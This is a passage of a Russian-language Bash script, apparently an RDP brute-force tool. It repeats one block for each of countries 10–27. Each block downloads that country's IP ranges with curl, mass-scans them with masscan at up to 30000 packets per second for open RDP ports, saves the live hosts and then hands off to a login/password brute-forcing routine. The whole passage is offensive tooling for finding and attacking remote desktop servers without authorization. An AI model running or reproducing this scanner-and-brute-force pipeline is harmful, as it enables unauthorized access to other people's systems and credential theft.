trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "10" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ARMENIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Armenia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "11" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ARUBA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Aruba://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "12" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AUSTRALIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Australia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "13" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AUSTRIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Austria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "14" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AZERBAIJAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Azerbaijan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "15" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BAHAMAS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bahamas://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "16" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BAHRAIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bahrain://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "17" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BANGLADESH |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bangladesh://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "18" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BARBADOS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Barbados://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "19" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BELARUS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Belarus://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "20" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BELGIUM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Belgium://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "21" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BELIZE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Belize://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "22" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BENIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Benin://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "23" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BERMUDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bermuda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "24" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BHUTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bhutan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "25" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BOLIVIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bolivia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "26" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BOSNIA+AND+HERZEGOWINA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bosnia and Herzegowina://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "27" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BOTSWANA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Botswana://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
